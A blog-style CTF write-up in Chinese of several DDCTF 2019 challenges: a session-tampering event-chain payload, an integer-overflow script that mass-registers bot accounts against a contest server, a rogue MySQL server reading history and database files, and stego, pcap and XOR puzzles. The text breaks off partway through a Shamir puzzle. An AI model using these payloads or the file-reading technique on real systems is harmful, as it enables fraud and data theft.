<p>HTTP/1.1 200 OK<br>Server: gunicorn/19.7.1<br>Date: Thu, 18 Apr 2019 17:48:50 GMT<br>Connection: close<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 113<br>Set-Cookie: session=.eJyrVsrJT1eyiq5WUkhSslKKDPczSAy3LPXP9TJMDSk2VKrVgUlF5YWVRlYVZCUZmValhBvmRBg7lSWGmxr4V4XaApWhG5AXVRAVkWwOVJEdFZEOVBEbq6OUV5obn1mSmlusZGWgo1SQn5lXAmQa1wIA440qLQ.D5pKAg.g3KyTELFqHt0j9fGhwyOR29FfmE; HttpOnly; Path=/</p>
<p>ERROR! All transactions have been cancelled. <br><a href="./?action:view;index">Go back to index.html</a><br></p>
</blockquote>
<p>将request的session进行base64解码：</p>
<blockquote>
<p>{“log”:[{“ b”:”YWN0aW9uOnZpZXc7c2hvcA==”}],”num_items”:0,”points”:6}[@vK;Vd$emA.</p>
</blockquote>
<p>大致可以确定目标，所以现在需要找到secret_key，尝试了一番，没有ssti，所以这个思路不对</p>
<ul>
<li>代码分析：</li>
<li>get_mid_str函数：<pre><code>def get_mid_str(haystack, prefix, postfix=None):
  haystack = haystack[haystack.find(prefix)+len(prefix):]
  if postfix is not None:
      haystack = haystack[:haystack.find(postfix)]
  return haystack
</code></pre></li>
<li>再定位到execute_event_loop()：<pre><code>while len(request.event_queue) &gt; 0:
      event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;
      request.event_queue = request.event_queue[1:]
      if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)): continue
      for c in event:
          if c not in valid_event_chars: break
      else:
          is_action = event[0] == &#39;a&#39;
          action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)
          args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)
</code></pre>大致确定划分规则：<code>action:buy:1#;</code></li>
<li>函数执行规则：<pre><code>          try:
              event_handler = eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))
              ret_val = event_handler(args)
</code></pre></li>
<li>trigger_event:<pre><code>def trigger_event(event):
  session[&#39;log&#39;].append(event)
  if len(session[&#39;log&#39;]) &gt; 5: session[&#39;log&#39;] = session[&#39;log&#39;][-5:]
  if type(event) == type([]):
      request.event_queue += event
  else:
      request.event_queue.append(event)
</code></pre></li>
</ul>
<ul>
<li>将event加入到session[‘log’],循环存入队列中：<pre><code>@app.route(url_prefix+&#39;/&#39;)
def entry_point():
  querystring = urllib.unquote(request.query_string)
  request.event_queue = []
  if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100:
      querystring = &#39;action:index;False#False&#39;
  if &#39;num_items&#39; not in session:
      session[&#39;num_items&#39;] = 0
      session[&#39;points&#39;] = 3
      session[&#39;log&#39;] = []
  request.prev_session = dict(session)
  trigger_event(querystring)
  return execute_event_loop()
</code></pre>利用链则为：调用trigger_event,传入buy，得以纂改num_items，再调用get_flag_handler，获得flag<br>payload：<code>?action:trigger_event%23;action:buy;5%23action:get_flag;</code><br>最后将session进行破解可得<br>参考：<br><a href="https://www.smi1e.top/ddctf2019-%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/ddctf2019-%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/</a><br><a href="http://12end.xyz/ddctf-writeup/" target="_blank" rel="noopener">http://12end.xyz/ddctf-writeup/</a></li>
</ul>
<h3 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h3><p>一个登录和注册页面，尝试注册登录，入场券2000，balance100，于是在订单和购买时进行各种抓包，发现在形成订单时，会有如下请求</p>
<blockquote>
<p>GET /ctf/api/buy_ticket?ticket_price=2000 HTTP/1.1<br>Host: 117.51.147.155:5050<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: application/json<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://117.51.147.155:5050/index.html" target="_blank" rel="noopener">http://117.51.147.155:5050/index.html</a><br>Connection: close<br>Cookie: user_name=shit; REVEL_SESSION=7af3ebc932b9a89f407e28a145433bb2</p>
</blockquote>
<p><strong>ticket_price</strong>可以更改，但只能改的比2000大，看了writeup，可以利用整数溢出，并且注意到一点：cookie中有<strong>revel-session</strong>字段，查了一下，所以这题是基于GoWeb，在go语言中：<br><img src="http://img.mukewang.com/5529fac20001b2f506320482.jpg" alt=""><br>各长度大小为：<br><img src="http://img.mukewang.com/552a276d0001663510160280.jpg" alt=""><br>传入<strong>4294967297</strong>，这里要注意的是，溢出发生在支付时，成功进入后，会分配一个id和ticket，然而得到flag的条件是：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419110834-6aedb18a-6250-1.png" alt=""><br>移除100个id和ticket，有个思路就是注册100个账户然后将他们删除：</p>
<pre><code>#__author__=https://www.zhaoj.in/read-5269.html

import threading
from concurrent.futures.thread import ThreadPoolExecutor

import requests

main_session = requests.session()

main_session.get(&quot;http://38.106.21.229:5000/ctf/api/login?name=glzjinmiaomiao&amp;password=miaomiao&quot;)

mutex = threading.Lock()


def remove_bot(id, ticket):
    global main_session

    print(main_session.get(&quot;http://38.106.21.229:5000/ctf/api/get_flag&quot;).json())

    print(main_session.get(&quot;http://38.106.21.229:5000/ctf/api/remove_robot?id=&quot; + str(id) + &quot;&amp;ticket=&quot; + str(ticket)).json())


def create_bot(index=1):
    s = requests.Session()

    s.get(&#39;http://38.106.21.229:5000/ctf/api/register?name=glzjinb4ot&#39; + str(index) + &#39;&amp;password=12345678&#39;)

    r = s.get(&#39;http://38.106.21.229:5000/ctf/api/buy_ticket?ticket_price=4294967296&#39;)

    r = s.get(&quot;http://38.106.21.229:5000/ctf/api/pay_ticket?bill_id=&quot; + r.json()[&#39;data&#39;][0][&#39;bill_id&#39;])

    return r.json()[&#39;data&#39;][0][&#39;your_id&#39;], r.json()[&#39;data&#39;][0][&#39;your_ticket&#39;]


def create_and_remove(index=1):
    info = create_bot(index)
    remove_bot(info[0], info[1])


pool = ThreadPoolExecutor(max_workers=32)

for i in range(1, 10000):
    pool.submit(create_and_remove, i)

pool.shutdown(True)
</code></pre><h3 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h3><p><img src="https://i.imgur.com/DPT4FUl.png" alt=""><br>agent.py代码如下：</p>
<pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 12/1/2019 2:58 PM
# @Author  : fz
# @Site    : 
# @File    : agent.py
# @Software: PyCharm

import json
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from optparse import OptionParser
from subprocess import Popen, PIPE


class RequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        request_path = self.path

        print(&quot;\n----- Request Start -----&gt;\n&quot;)
        print(&quot;request_path :&quot;, request_path)
        print(&quot;self.headers :&quot;, self.headers)
        print(&quot;&lt;----- Request End -----\n&quot;)

        self.send_response(200)
        self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;)
        self.end_headers()

        result = self._func()
        self.wfile.write(json.dumps(result))


    def do_POST(self):
        request_path = self.path

        # print(&quot;\n----- Request Start -----&gt;\n&quot;)
        print(&quot;request_path : %s&quot;, request_path)

        request_headers = self.headers
        content_length = request_headers.getheaders(&#39;content-length&#39;)
        length = int(content_length[0]) if content_length else 0

        # print(&quot;length :&quot;, length)

        print(&quot;request_headers : %s&quot; % request_headers)
        print(&quot;content : %s&quot; % self.rfile.read(length))
        # print(&quot;&lt;----- Request End -----\n&quot;)

        self.send_response(200)
        self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;)
        self.end_headers()
        result = self._func()
        self.wfile.write(json.dumps(result))

    def _func(self):
        netstat = Popen([&#39;netstat&#39;, &#39;-tlnp&#39;], stdout=PIPE)
        netstat.wait()

        ps_list = netstat.stdout.readlines()
        result = []
        for item in ps_list[2:]:
            tmp = item.split()
            Local_Address = tmp[3]
            Process_name = tmp[6]
            tmp_dic = {&#39;local_address&#39;: Local_Address, &#39;Process_name&#39;: Process_name}
            result.append(tmp_dic)
        return result

    do_PUT = do_POST
    do_DELETE = do_GET


def main():
    port = 8123
    print(&#39;Listening on localhost:%s&#39; % port)
    server = HTTPServer((&#39;0.0.0.0&#39;, port), RequestHandler)
    server.serve_forever()


if __name__ == &quot;__main__&quot;:
    parser = OptionParser()
    parser.usage = (
        &quot;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n&quot;
        &quot;Run:\n\n&quot;)
    (options, args) = parser.parse_args()

    main()
</code></pre><p>要求将他配置在自己的服务器上，代码功能分为三部分，读取get请求（do_GET），读取post请求（do_POST），端口状态检测（_func），启动后会将端口绑定在本地的<strong>8123</strong>端口进行监听</p>
<p>httpserver：</p>
<blockquote>
<p>class http.server.<strong>HTTPServer</strong>(server_address, RequestHandlerClass)<br>This class builds on the TCPServer class by storing the server address as instance variables named server_name and server_port. The server is accessible by the handler, typically through the handler’s server instance variable.</p>
</blockquote>
<p>BaseHTTPRequestHandler：</p>
<blockquote>
<p>class http.server.<strong>BaseHTTPRequestHandler</strong>(request, client_address, server)<br>This class is used to handle the HTTP requests that arrive at the server. By itself, it cannot respond to any actual HTTP requests; it must be subclassed to handle each request method (e.g. GET or POST). BaseHTTPRequestHandler provides a number of class and instance variables, and methods for use by subclasses.</p>
</blockquote>
<p>需要注意的是agent.py中的Process_name需要含有mysqld，直接改源码，端口写3306，然后跑<a href="https://github.com/allyshka/Rogue-MySql-Server中的脚本即可。" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server中的脚本即可。</a><br><img src="https://upload-images.jianshu.io/upload_images/9113969-12aa8b88d8b2b321.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>接下来就是找flag，可以直接读～/.mysql_history（注：这方法在后期复现时已经不管用了）<br><img src="https://upload-images.jianshu.io/upload_images/9113969-0b6d72ebf211f0f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>或者读取~/.bash_history，找到工作目录，读源码<br><img src="https://upload-images.jianshu.io/upload_images/9113969-7a3a9391b3c2c4bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-39fafc2acb6c5e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>/home/dc2-user/ctf_web_2/app/main/views.py</p>
<pre><code># coding=utf-8
from flask import jsonify, request
from struct import unpack
from socket import inet_aton
import MySQLdb
from subprocess import Popen, PIPE
import re
import os
import base64
# flag in mysql  curl@localhost database:security  table:flag
def weak_scan():
    agent_port = 8123
    result = []
    target_ip = request.args.get(\&#39;target_ip\&#39;)
    target_port = request.args.get(\&#39;target_port\&#39;)
.......
</code></pre><p>可以看到flag在security库flag表中。<br>my.cnf<br><img src="https://upload-images.jianshu.io/upload_images/9113969-cbbd8649f1a05f3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>/var/lib/mysql/security/flag.ibd<br><img src="https://upload-images.jianshu.io/upload_images/9113969-7dc23daf844d02e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h3><blockquote>
<p>Color Threshold</p>
<p>提示：AES ECB密钥为小写字母<br>提示2：密钥不足位用\0补全<br>提示3：不要光记得隐写不看图片本身啊…</p>
</blockquote>
<p><strong>颜色阈值：可以命令将灰度或彩色图像转换为高对比度的黑白图像。</strong></p>
<p>用stegsolve查看图片，lsb，发现一段base64，但是为不可见字符<br><img src="https://impakho.com/images/f0622488ab8ec745dc68568fe54c0905.png" alt=""></p>
<p>用ps打开图片，调整阀值，发现了<strong>魏公村</strong>这个站点有点特殊：<br><img src="https://impakho.com/images/39a3fb90b4177c0095d3c0c283a26916.png" alt=""><br>这里似乎有两种情况，在lsb和rsb情况下的base64不同：</p>
<h4 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h4><pre><code>from Crypto.Cipher import AES
from base64 import *

cipher=b64decode(&#39;7SsQWmZ524i/yVWoMeAIJA==&#39;)
key=&#39;weigongcun&#39;.ljust(16,&#39;\x00&#39;)
mode=AES.MODE_ECB

c=AES.new(key, mode)
print c.decrypt(cipher)
</code></pre><h4 id="rgb"><a href="#rgb" class="headerlink" title="rgb"></a>rgb</h4><pre><code>from Crypto.Cipher import AES
k=&quot;iKk/Ju3vu4wOnssdIaUSrg==&quot;
k=k.decode(&quot;base64&quot;)
kirin=AES.new(&quot;weigongcun\x00\x00\x00\x00\x00\x00&quot;,AES.MODE_ECB)
print kirin.decrypt(k)
#DDCTF{CD*Q23&amp;0}
</code></pre><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>折腾了半天<br>用wireshark打开，首先<strong>导出对象-&gt;http</strong>,如下图所示：<br><img src="https://i.imgur.com/Sta2aw4.png" alt=""><br>关注<strong>mime_multipart.type</strong>字段，仔细查看，发现了上传图片，于是将图片分离出来<br>具体步骤：选中图片信息的字段，<strong>右键导出分组</strong><br><img src="https://i.imgur.com/prDvD2A.png" alt=""><br>得到三张图：<br><img src="https://i.loli.net/2019/04/19/5cb918c66ab77.png" alt=""><br>第一张图把高度改为07 50，得到key：<br><img src="https://i.loli.net/2019/04/19/5cb918c66b135.png" alt=""><br>再将其他图片拿到数据包分析得出的地址：<a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a><br>去解密得到：<code>flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-</code><br>再将<a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">hex转ascii</a>：<code>lg+Hs-DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}+H-</code></p>
<h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><blockquote>
<p>原文为英语，请破解</p>
<p>014e084dda666a631b58d361627e5a5bcc327f651f14ef7c626a17558a71627d1251d87b656a5a47d3617f681714cf7c6a6f1651ce327f651f14dd7778791f46c4324a61165dcf612b641414fd7d79611e14fd73792d337d8a66642d0851cb762b7e0f56d9666a630e5dcb7e2b6c175bdf7c7f7e5a5bcc3246620847cf3f68621e51ce32796c1e5dc53268621759df7c626e1b40c37d657e5a5bcc327f651f14eb6a627e5a44c5656e7f0914de7a6a795a5ccb762b6f1f51c4326e63195dda7a6e7f1f508a67786414538a5765641d59cb32666c195cc37c6e7e5414fe7a627e5a4dc37767691f508a7f62611340cb60722d135ade7767611353cf7c68685a43c27b68655614cb7e64631d14dd7b7f655a40c2737f2d1c46c57f2b620e5ccf602b691f57d86b7b791f508a5373640914d8736f641514cb7c6f2d0e51c6777b7f135ade77792d0e46cb7c78601347d97b646309188a656a7e5a53c3646e635a40c2772b6e1550cf7c6a601f14ff7e7f7f1b1a8a4663640914dd73782d195bc46162691f46cf762b6f0314dd7778791f46c43258780a46cf7f6e2d3b58c67b6e695a77c57f666c1450cf602b490d5dcd7a7f2d3e1a8a57627e1f5ac27d7c680814de7d2b651b42cf3269681f5a8a306f68195dd97b7d685814de7d2b7912518a5367611351ce327d641940c5607223703efe7a6e2d3f5ac375666c5a59cb7163641451d9327c6808518a732b6b1b59c37e722d15528a62647f0e55c87e6e2d195dda7a6e7f5a59cb7163641451d9327c640e5c8a60647915468a61687f1b59c87e6e7f091a8a5564621e14c5626e7f1b40c37c6c2d0a46c5716e690f46cf61272d0a46c5626e7f164d8a77656b1546c9776f215a43c56767695a5ccb646e2d1755ce772b7912518a6267781d56c57379695a71c47b6c601b14c7736865135acf327e631846cf73606c1858cf3c2b451543cf646e7f5614c77d78795a5bcc327f651f14ed7779601b5a8a7f62611340cb60722d1c5bd8716e7e5614d977687f1f408a616e7f0c5dc977782d1b5ace3268640c5dc67b6a635a55cd77656e1351d9327f651b408a6778681e14ef7c626a17558a77667d165bd3776f2d0a5bc5602b620a51d8737f6414538a6279621951ce67796809188a7365695a5dde327c6c0914de7a6e7e1f14da7d647f5a44d87d68681e41d877782d0e5ccb662b6c1658c5656e695a40c2772b48145dcd7f6a2d1755c97a62631f478a66642d18518a606e7b1f46d97726681453c37c6e680851ce326a631e14de7a6e2d195dda7a6e7f0914de7d2b6f1f14d8776a69543ea04663685a73cf60666c1414da7e7e6a185bcb606f201f45df7b7b7d1f508a5765641d59cb3269681955c7772b431b4ec3324c680859cb7c722a0914da606263195dda73672d1946d3627f625747d3617f68171a8a5b7f2d0d55d932697f155fcf7c2b6f0314de7a6e2d2a5bc67b78655a73cf7c6e7f1b588a417f6c1c528d612b4e1344c277792d3841d8776a785a5dc4324f681951c7706e7f5a05932139215a43c366632d0e5ccf326a641e14c5742b4b0851c47163200941da6267641f508a7b65791f58c67b6c681457cf32666c0e51d87b6a615a5bc8666a641451ce326d7f15598a732b4a1f46c773652d0944d33c2b4c5a59c57c7f655a56cf74647f1f14de7a6e2d1541de7079681b5f8a7d6d2d2d5bd87e6f2d2d55d83242445614cb662b6c5a57c57c6d680851c4716e2d1251c6762b631f55d8325c6c0847cb65272d0e5ccf325b62165dd97a2b4e1344c277792d3841d8776a785a47c27379681e14c366782d3f5ac375666c5756d8776a66135acd327f68195cc47b7a781f478a7365695a40cf7163631558c575722d0d5dde7a2b7912518a5479681457c2326a631e14e86062791347c23c2b490f46c37c6c2d0e5ccf324c680859cb7c2b641442cb6162621414c5742b5d1558cb7c6f215a57c5606e2d2a5bc67b78655a77c36263680814e86779681b418a626e7f095bc47c6e615a43cf606e2d1f42cb717e6c0e51ce3e2b7b13558a4064601b5ac373272d0e5b8a54796c1457cf327c651f46cf327f651f4d8a7778791b56c67b78651f508a6663685a64e932497f0f5ac53278641d5acb7e782d135ade7767611353cf7c68685a47de737f64155a8a6562791214ec606e63195c8a746a6e1358c36662680914d9677b7d1546de3c2b5e0f57c977787e1c41c63268621544cf606a79135bc4326a60155acd327f651f14fa7d676809188a6663685a72d877656e12188a7365695a40c2772b4f085dde7b78655a55de3249611f40c97a67680314fa7379665a57c57c7f641441cf762b781440c37e2b470f5acf323a344e0486327c651f5a8a54796c1457cf3278780846cf7c6f680851ce327f625a40c2772b4a1f46c773657e543ea05479621714de7a627e5a56cf756263145dc475272d0e5ccf32497f1340c361632d3d5bdc7779631751c4662b4e1550cf326a631e14e96b7b651f468a416865155bc632234a3912e941222d1b408a5067680e57c27e6e745a64cb60602d1841c37e7f2d0f448a73652d1f4cde77657e1342cf32687f0344de73656c164dde7b682d1955da736964165dde6b252d335ac366626c1658d33e2b7912518a766e6e084dda6662621414dd73782d1755c37c67745a5bcc3247781c40dd736d6b1f1482556e7f1755c4326a640814cc7d796e1f1d8a7365695a558a746e7a5a7ccf77792d5273cf60666c1414cb6066745314c777787e1b53cf61272d1b478a6663685a7fd87b6e6a0959cb6062631f1482556e7f1755c432656c0c4d83326e600a58c56b6e695a59df71632d175bd8772b7e1f57df606e2d0a46c5716e690f46cf612b6b15468a67786414538a5765641d59cb3c2b4c1655c4325f78085dc475272d1b14e973666f085dce756e2d2f5ac3646e7f095dde6b2b601b40c277666c0e5dc97b6a635a55c4762b611553c371626c14188a6279620c5dce776f2d1741c97a2b621c14de7a6e2d1546c37562631b588a666364145fc37c6c2d0e5ccb662b611f508a66642d0e5ccf326f68095dcd7c2b621c14de7a6e2d1946d3627f6c1455c66b7f641955c63269621756cf32666c195cc37c6e7e5a40c2737f2d0d51d8772b641447de607e601f5ade73672d135a8a777d681440df7367610314c8606e6c115dc4752b7912518a7c6a7b1b588a5765641d59cb3c2b451543cf646e7f5614de7a6e2d3146c3776c7e1755d87b65685a5dc46679621e41c9776f2d1b5a8a5765641d59cb327d680847c37d652d0d5dde7a2b6c5a52c56779791214d87d7f620814cc7d792d1340d9325e20185bcb6678215a46cf617e610e5dc4752b641414cb327b7f1558c57c6c681e14da77796415508a6563681414de7a6e7e1f14c777787e1b53cf612b6e1541c6762b6315408a706e2d1e51c960727d0e51ce3c2b5a1340c2327f651f14c9737b790f46cf32646b5a46cf7e6e7b1b5ade3268640a5ccf602b661f4dd9326a631e14de7a6e2d0f47cf32646b5a59df71632d1c55d9666e7f5a61f932456c0c4d8a7064601851d93e2b7f1f53df7e6a7f5614d8737b641e14d8776a69135acd32646b5a618770646c0e14c777787e1b53cf612b7f1f47df7f6e69543ea04663685a52c6736c2d134790324f493960ec693b3a1805c8263d694b50c82033354e07ce236d694d02922a326b1f559370383b07</p>
</blockquote>
<p>将所给的字符串转为二进制文件：<code>echo &lt;上述字符串&gt;|xxd -r -ps&gt;test</code></p>
<blockquote>
<p>xxd // xxd 命令用于用二进制或十六进制显示文件的内容<br>-r // 把xxd的十六进制输出内容转换回原文件的二进制内容<br>-ps // 以 postscript的连续十六进制转储输出，这也叫做纯十六进制转储</p>
</blockquote>
<p>然后用<a href="https://github.com/hellman/xortool" target="_blank" rel="noopener">xortool</a>进行分析得到：</p>
<blockquote>
<p>$admin~&gt;python xortool -c 20 test<br>The most probable key lengths:<br>   3:   11.9%<br>   6:   19.7%<br>   9:   9.3%<br>  12:   14.5%<br>  15:   7.1%<br>  18:   11.2%<br>  21:   5.4%<br>  24:   8.4%<br>  30:   6.8%<br>  36:   5.7%<br>Key-length can be 3*n<br>2 possible key(s) of length 6:<br>\x0b\rz4\xaa\x12<br>N\rz4\xaa\x12<br>Found 2 plaintexts with 95.0%+ valid characters<br>See files filename-key.csv, filename-char_used-perc_valid.csv</p>
</blockquote>
<p>于是将得到的密钥与原文本进行xor：</p>
<pre><code>key=&quot;014e084dda666a631b58d361627e5a5bcc327f651f14ef7c626a17558a71627d1251d87b656a5a47d3617f681714cf7c6a6f1651ce327f651f14dd7778791f46c4324a61165dcf612b641414fd7d79611e14fd73792d337d8a66642d0851cb762b7e0f56d9666a630e5dcb7e2b6c175bdf7c7f7e5a5bcc3246620847cf3f68621e51ce32796c1e5dc53268621759df7c626e1b40c37d657e5a5bcc327f651f14eb6a627e5a44c5656e7f0914de7a6a795a5ccb762b6f1f51c4326e63195dda7a6e7f1f508a67786414538a5765641d59cb32666c195cc37c6e7e5414fe7a627e5a4dc37767691f508a7f62611340cb60722d135ade7767611353cf7c68685a43c27b68655614cb7e64631d14dd7b7f655a40c2737f2d1c46c57f2b620e5ccf602b691f57d86b7b791f508a5373640914d8736f641514cb7c6f2d0e51c6777b7f135ade77792d0e46cb7c78601347d97b646309188a656a7e5a53c3646e635a40c2772b6e1550cf7c6a601f14ff7e7f7f1b1a8a4663640914dd73782d195bc46162691f46cf762b6f0314dd7778791f46c43258780a46cf7f6e2d3b58c67b6e695a77c57f666c1450cf602b490d5dcd7a7f2d3e1a8a57627e1f5ac27d7c680814de7d2b651b42cf3269681f5a8a306f68195dd97b7d685814de7d2b7912518a5367611351ce327d641940c5607223703efe7a6e2d3f5ac375666c5a59cb7163641451d9327c6808518a732b6b1b59c37e722d15528a62647f0e55c87e6e2d195dda7a6e7f5a59cb7163641451d9327c640e5c8a60647915468a61687f1b59c87e6e7f091a8a5564621e14c5626e7f1b40c37c6c2d0a46c5716e690f46cf61272d0a46c5626e7f164d8a77656b1546c9776f215a43c56767695a5ccb646e2d1755ce772b7912518a6267781d56c57379695a71c47b6c601b14c7736865135acf327e631846cf73606c1858cf3c2b451543cf646e7f5614c77d78795a5bcc327f651f14ed7779601b5a8a7f62611340cb60722d1c5bd8716e7e5614d977687f1f408a616e7f0c5dc977782d1b5ace3268640c5dc67b6a635a55cd77656e1351d9327f651b408a6778681e14ef7c626a17558a77667d165bd3776f2d0a5bc5602b620a51d8737f6414538a6279621951ce67796809188a7365695a5dde327c6c0914de7a6e7e1f14da7d647f5a44d87d68681e41d877782d0e5ccb662b6c1658c5656e695a40c2772b48145dcd7f6a2d1755c97a62631f478a66642d18518a606e7b1f46d97726681453c37c6e680851ce326a631e14de7a6e2d195dda7a6e7f0914de7d2b6f1f14d8776a69543ea04663685a73cf60666c1414da7e7e6a185bcb606f201f45df7b7b7d1f508a5765641d59cb3269681955c7772b431b4ec3324c680859cb7c722a0914da606263195dda73672d1946d3627f625747d3617f68171a8a5b7f2d0d55d932697f155fcf7c2b6f0314de7a6e2d2a5bc67b78655a73cf7c6e7f1b588a417f6c1c528d612b4e1344c277792d3841d8776a785a5dc4324f681951c7706e7f5a05932139215a43c366632d0e5ccf326a641e14c5742b4b0851c47163200941da6267641f508a7b65791f58c67b6c681457cf32666c0e51d87b6a615a5bc8666a641451ce326d7f15598a732b4a1f46c773652d0944d33c2b4c5a59c57c7f655a56cf74647f1f14de7a6e2d1541de7079681b5f8a7d6d2d2d5bd87e6f2d2d55d83242445614cb662b6c5a57c57c6d680851c4716e2d1251c6762b631f55d8325c6c0847cb65272d0e5ccf325b62165dd97a2b4e1344c277792d3841d8776a785a47c27379681e14c366782d3f5ac375666c5756d8776a66135acd327f68195cc47b7a781f478a7365695a40cf7163631558c575722d0d5dde7a2b7912518a5479681457c2326a631e14e86062791347c23c2b490f46c37c6c2d0e5ccf324c680859cb7c2b641442cb6162621414c5742b5d1558cb7c6f215a57c5606e2d2a5bc67b78655a77c36263680814e86779681b418a626e7f095bc47c6e615a43cf606e2d1f42cb717e6c0e51ce3e2b7b13558a4064601b5ac373272d0e5b8a54796c1457cf327c651f46cf327f651f4d8a7778791b56c67b78651f508a6663685a64e932497f0f5ac53278641d5acb7e782d135ade7767611353cf7c68685a47de737f64155a8a6562791214ec606e63195c8a746a6e1358c36662680914d9677b7d1546de3c2b5e0f57c977787e1c41c63268621544cf606a79135bc4326a60155acd327f651f14fa7d676809188a6663685a72d877656e12188a7365695a40c2772b4f085dde7b78655a55de3249611f40c97a67680314fa7379665a57c57c7f641441cf762b781440c37e2b470f5acf323a344e0486327c651f5a8a54796c1457cf3278780846cf7c6f680851ce327f625a40c2772b4a1f46c773657e543ea05479621714de7a627e5a56cf756263145dc475272d0e5ccf32497f1340c361632d3d5bdc7779631751c4662b4e1550cf326a631e14e96b7b651f468a416865155bc632234a3912e941222d1b408a5067680e57c27e6e745a64cb60602d1841c37e7f2d0f448a73652d1f4cde77657e1342cf32687f0344de73656c164dde7b682d1955da736964165dde6b252d335ac366626c1658d33e2b7912518a766e6e084dda6662621414dd73782d1755c37c67745a5bcc3247781c40dd736d6b1f1482556e7f1755c4326a640814cc7d796e1f1d8a7365695a558a746e7a5a7ccf77792d5273cf60666c1414cb6066745314c777787e1b53cf61272d1b478a6663685a7fd87b6e6a0959cb6062631f1482556e7f1755c432656c0c4d83326e600a58c56b6e695a59df71632d175bd8772b7e1f57df606e2d0a46c5716e690f46cf612b6b15468a67786414538a5765641d59cb3c2b4c1655c4325f78085dc475272d1b14e973666f085dce756e2d2f5ac3646e7f095dde6b2b601b40c277666c0e5dc97b6a635a55c4762b611553c371626c14188a6279620c5dce776f2d1741c97a2b621c14de7a6e2d1546c37562631b588a666364145fc37c6c2d0e5ccb662b611f508a66642d0e5ccf326f68095dcd7c2b621c14de7a6e2d1946d3627f6c1455c66b7f641955c63269621756cf32666c195cc37c6e7e5a40c2737f2d0d51d8772b641447de607e601f5ade73672d135a8a777d681440df7367610314c8606e6c115dc4752b7912518a7c6a7b1b588a5765641d59cb3c2b451543cf646e7f5614de7a6e2d3146c3776c7e1755d87b65685a5dc46679621e41c9776f2d1b5a8a5765641d59cb327d680847c37d652d0d5dde7a2b6c5a52c56779791214d87d7f620814cc7d792d1340d9325e20185bcb6678215a46cf617e610e5dc4752b641414cb327b7f1558c57c6c681e14da77796415508a6563681414de7a6e7e1f14c777787e1b53cf612b6e1541c6762b6315408a706e2d1e51c960727d0e51ce3c2b5a1340c2327f651f14c9737b790f46cf32646b5a46cf7e6e7b1b5ade3268640a5ccf602b661f4dd9326a631e14de7a6e2d0f47cf32646b5a59df71632d1c55d9666e7f5a61f932456c0c4d8a7064601851d93e2b7f1f53df7e6a7f5614d8737b641e14d8776a69135acd32646b5a618770646c0e14c777787e1b53cf612b7f1f47df7f6e69543ea04663685a52c6736c2d134790324f493960ec693b3a1805c8263d694b50c82033354e07ce236d694d02922a326b1f559370383b07&quot;
key=key.decode(&quot;hex&quot;)
ans=&quot;&quot;
k=&quot;\x0b\rz4\xaa\x12&quot;    #N\rz4\xaa\x12
for i in range(len(key)):
  ans+=chr(ord(key[i])^ord(k[i%len(k)]))
print ans
</code></pre><p>成功得到flag：DDCTF{07b1b46d1db28843d1fd76889fea9b36}</p>
<h2 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h2><blockquote>
<p>为了共同的利益，【组织1】和【组织2】成立了联盟，并遵守共同约定的协议。为了让协议的制定和修改更加公<br>平，组织1和组织2共同决定：当三位以上【组织1】成员和三位以上【组织2】成员同意时，才可以制定或修改协<br>议。为了实现这一功能，联盟的印章被锁在密码保险柜中，而保险柜的密码只通过Shamir秘密分享方案分享给【组织<br>1】和【组织2】的每一位成员。<br>现在，【组织1】的【成员1】、【成员2】、【成员4】，【组织2】的【成员3】、【成员4】、【成员5】一致同<br>意制定新的协议。请还原出这套方案的设计思路，按照这套方案的思路恢复出保险柜密码，取出印章吧！</p>
<p>以下为使用到的7个十六进制常数：</p>
